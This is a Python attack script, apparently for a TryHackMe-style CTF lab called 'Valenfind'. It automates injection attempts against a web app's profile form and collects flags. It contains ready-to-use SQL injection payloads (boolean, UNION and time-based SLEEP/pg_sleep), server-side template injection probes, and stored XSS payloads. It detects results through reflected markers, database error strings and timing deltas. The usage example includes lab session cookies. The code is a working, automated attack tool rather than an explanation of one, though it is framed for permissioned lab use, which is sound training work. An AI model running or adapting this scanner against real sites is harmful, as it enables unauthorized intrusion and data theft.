#!/usr/bin/env python3
"""Valenfind helper: automate profile-field attack attempts.

This script is designed for CTF/lab targets where you already have permission.
It focuses on these endpoints:
  - /register (optional cookie priming check)
  - /complete_profile (submit payloads)
  - /my_profile (check reflected/stored output)

What it tries:
  1) SSTI probes (e.g. {{7*7}}) for template injection hints
  2) SQLi-like payloads and timing deltas for weak backend validation
  3) Stored XSS probes by checking whether payload markers are reflected raw

Usage example:
  python owasp_hunt/try_owasp_hunt.py \
	--base-url http://10.112.165.127:5000 \
	--cookie-name session \
	--cookie "eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiMTIzIn0.aeFLFA.efdhJ78NfiztsKIzas2UVa5PXzw" \
	--alt-cookie ".eJwljEEKwjAUBa_yfesiqCu78wbupZRP-qrBpCn5yaKU3t2Aq5nZzI5xDmofGvrXDikNiDTTN9Hh4VyqSxGXqYXTSZ6BahSX4hpYKFuqWdacZh94xnAMHYL_cmqbptWYR9_i_vdFI9Hjcr3h-AEITyjz.aeFLFA.qlotgrsCHcBudjmxf4eS5QO9y1A"
"""

from __future__ import annotations

import argparse
import html
import random
import re
import string
import time
from dataclasses import dataclass
from typing import Dict, List, Tuple

import requests


FIELD_CANDIDATES = [
	"real_name",
	"name",
	"full_name",
	"email",
	"phone",
	"address",
	"home_address",
	"bio",
	"about",
]


SSTI_PAYLOADS = [
	"{{7*7}}",
	"${7*7}",
	"#{7*7}",
	"{{1337+5}}",
]


SQLI_PAYLOADS = [
	"test' OR '1'='1'--",
	"test' OR 1=1--",
	"test' UNION SELECT NULL--",
	"test') OR ('1'='1",
]


SQLI_TIME_PAYLOADS = [
	"test' OR SLEEP(5)--",
	"test'; SELECT pg_sleep(5)--",
	"test' || randomblob(900000000)--",
]


XSS_PAYLOADS = [
	"<svg/onload=alert('vf_xss')>",
	"\"><img src=x onerror=alert('vf_xss')>",
]


FLAG_RE = re.compile(r"THM\{[^}]+\}", re.I)


@dataclass
class ProbeResult:
	cookie_label: str
	probe_type: str
	payload: str
	post_status: int
	get_status: int
	reflected: bool
	executed_hint: bool
	time_delta: float
	notes: str


def rand_marker(prefix: str = "VF") -> str:
	tail = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
	return f"{prefix}_{tail}"


def parse_fields_and_hidden_inputs(body: str) -> Tuple[List[str], Dict[str, str]]:
	fields = []
	hidden = {}

	# Small regex-based extractor to avoid extra parser dependencies.
	for m in re.finditer(r"<input[^>]*>", body, flags=re.I):
		tag = m.group(0)
		name_m = re.search(r"name\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
		if not name_m:
			continue
		name = name_m.group(1)
		fields.append(name)
		type_m = re.search(r"type\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
		if type_m and type_m.group(1).lower() == "hidden":
			value_m = re.search(r"value\s*=\s*['\"]([^'\"]*)['\"]", tag, flags=re.I)
			hidden[name] = value_m.group(1) if value_m else ""

	for m in re.finditer(r"<textarea[^>]*>", body, flags=re.I):
		tag = m.group(0)
		name_m = re.search(r"name\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
		if name_m:
			fields.append(name_m.group(1))

	dedup = []
	seen = set()
	for f in fields:
		if f not in seen:
			seen.add(f)
			dedup.append(f)

	return dedup, hidden


def build_profile_data(fields: List[str], hidden: Dict[str, str], payload: str, marker: str) -> Dict[str, str]:
	data: Dict[str, str] = dict(hidden)

	if not fields:
		# Conservative fallback if the form parser fails.
		fields = FIELD_CANDIDATES.copy()

	for name in fields:
		nl = name.lower()
		if name in hidden:
			continue
		if any(k in nl for k in ["email", "mail"]):
			data[name] = f"{marker.lower()}@example.com"
		elif any(k in nl for k in ["phone", "tel"]):
			data[name] = "123456789"
		elif "address" in nl:
			data[name] = f"{payload} {marker}"
		else:
			data[name] = f"{payload} {marker}"

	return data


def visible_text(html_body: str) -> str:
	no_script = re.sub(r"<script\b[^<]*(?:(?!</script>)<[^<]*)*</script>", "", html_body, flags=re.I)
	stripped = re.sub(r"<[^>]+>", " ", no_script)
	return html.unescape(re.sub(r"\s+", " ", stripped)).strip()


def do_profile_probe(
	sess: requests.Session,
	base_url: str,
	cookie_label: str,
	probe_type: str,
	payload: str,
	timeout: float,
) -> ProbeResult:
	complete_url = f"{base_url}/complete_profile"
	profile_url = f"{base_url}/my_profile"

	# Step 1: Fetch form to discover fields and possible anti-CSRF hidden values.
	r0 = sess.get(complete_url, timeout=timeout, allow_redirects=True)
	fields, hidden = parse_fields_and_hidden_inputs(r0.text)

	marker = rand_marker(probe_type)
	data = build_profile_data(fields, hidden, payload, marker)

	t0 = time.perf_counter()
	rp = sess.post(complete_url, data=data, timeout=max(8.0, timeout), allow_redirects=True)
	t_post = time.perf_counter() - t0

	rg = sess.get(profile_url, timeout=timeout, allow_redirects=True)
	text = visible_text(rg.text)
	raw = rg.text

	reflected = marker in raw or marker in text
	executed_hint = False
	notes = []

	if probe_type == "SSTI":
		# If template expression got evaluated, we often see 49 or 1342.
		if re.search(r"\b49\b", text) or re.search(r"\b1342\b", text):
			executed_hint = True
			notes.append("SSTI evaluation hint")
	elif probe_type == "XSS":
		if any(tag in raw.lower() for tag in ["<svg", "<img", "onerror", "onload", "<script"]):
			executed_hint = True
			notes.append("raw HTML/JS reflected")
	elif probe_type.startswith("SQLI"):
		db_err = re.search(
			r"sqlite|sql syntax|mysql|postgres|psycopg|unclosed quotation|database error",
			rg.text,
			re.I,
		)
		if db_err:
			executed_hint = True
			notes.append(f"DB error hint: {db_err.group(0)}")
		if probe_type == "SQLI_TIME" and t_post >= 4.0:
			executed_hint = True
			notes.append(f"timing delay observed ({t_post:.2f}s)")

	flags = FLAG_RE.findall(rg.text)
	if flags:
		notes.append("flag(s): " + ", ".join(flags))

	return ProbeResult(
		cookie_label=cookie_label,
		probe_type=probe_type,
		payload=payload,
		post_status=rp.status_code,
		get_status=rg.status_code,
		reflected=reflected,
		executed_hint=executed_hint,
		time_delta=t_post,
		notes="; ".join(notes) if notes else "-",
	)


def run_cookie_set(
	base_url: str,
	cookie_name: str,
	cookie_value: str,
	timeout: float,
	max_each: int,
	check_register: bool,
	label: str,
) -> List[ProbeResult]:
	results: List[ProbeResult] = []
	s = requests.Session()
	s.cookies.set(cookie_name, cookie_value)

	if check_register:
		reg = s.get(f"{base_url}/register", timeout=timeout, allow_redirects=True)
		print(f"[{label}] GET /register -> {reg.status_code} ({len(reg.text)} bytes)")

	cp = s.get(f"{base_url}/complete_profile", timeout=timeout, allow_redirects=True)
	print(f"[{label}] GET /complete_profile -> {cp.status_code} ({len(cp.text)} bytes)")

	for payload in SSTI_PAYLOADS[:max_each]:
		results.append(do_profile_probe(s, base_url, label, "SSTI", payload, timeout))

	for payload in SQLI_PAYLOADS[:max_each]:
		results.append(do_profile_probe(s, base_url, label, "SQLI", payload, timeout))

	for payload in SQLI_TIME_PAYLOADS[:max_each]:
		results.append(do_profile_probe(s, base_url, label, "SQLI_TIME", payload, timeout))

	for payload in XSS_PAYLOADS[:max_each]:
		results.append(do_profile_probe(s, base_url, label, "XSS", payload, timeout))

	return results


def print_results(results: List[ProbeResult]) -> None:
	if not results:
		print("No results.")
		return

	print("\n" + "=" * 130)
	print("cookie      probe      post  get   refl  hint  t_post  payload")
	print("-" * 130)
	for r in results:
		payload_short = (r.payload[:54] + "...") if len(r.payload) > 57 else r.payload
		print(
			f"{r.cookie_label:<10} {r.probe_type:<10} {r.post_status:<5} {r.get_status:<5} "
			f"{str(r.reflected):<5} {str(r.executed_hint):<5} {r.time_delta:>6.2f}s  {payload_short}"
		)
	print("=" * 130)

	interesting = [r for r in results if r.executed_hint or "THM{" in r.notes]
	print("\nInteresting findings:")
	if not interesting:
		print("  - No high-confidence exploit indicator yet.")
		return

	for r in interesting:
		print(f"  - [{r.cookie_label}] {r.probe_type} :: {r.payload}")
		print(f"    Notes: {r.notes}")


def main() -> int:
	parser = argparse.ArgumentParser(description="Valenfind /complete_profile exploit-attempt helper")
	parser.add_argument("--base-url", default="http://10.112.165.127:5000", help="Target base URL")
	parser.add_argument("--cookie-name", default="session", help="Cookie name (default: session)")
	parser.add_argument("--cookie", required=True, help="Primary cookie value")
	parser.add_argument("--alt-cookie", default="", help="Optional second cookie value")
	parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout seconds")
	parser.add_argument(
		"--max-each",
		type=int,
		default=2,
		help="How many payloads per class to test (default: 2)",
	)
	parser.add_argument(
		"--check-register",
		action="store_true",
		help="Also fetch /register before tests (useful for cookie/session behavior checks)",
	)
	args = parser.parse_args()

	base = args.base_url.rstrip("/")
	all_results: List[ProbeResult] = []

	print(f"Target: {base}")
	print(f"Cookie name: {args.cookie_name}")

	try:
		all_results.extend(
			run_cookie_set(
				base_url=base,
				cookie_name=args.cookie_name,
				cookie_value=args.cookie,
				timeout=args.timeout,
				max_each=max(1, args.max_each),
				check_register=args.check_register,
				label="primary",
			)
		)

		if args.alt_cookie:
			all_results.extend(
				run_cookie_set(
					base_url=base,
					cookie_name=args.cookie_name,
					cookie_value=args.alt_cookie,
					timeout=args.timeout,
					max_each=max(1, args.max_each),
					check_register=args.check_register,
					label="alt",
				)
			)
	except requests.RequestException as exc:
		print(f"Network/request error: {exc}")
		return 1

	print_results(all_results)
	return 0


if __name__ == "__main__":
	raise SystemExit(main())

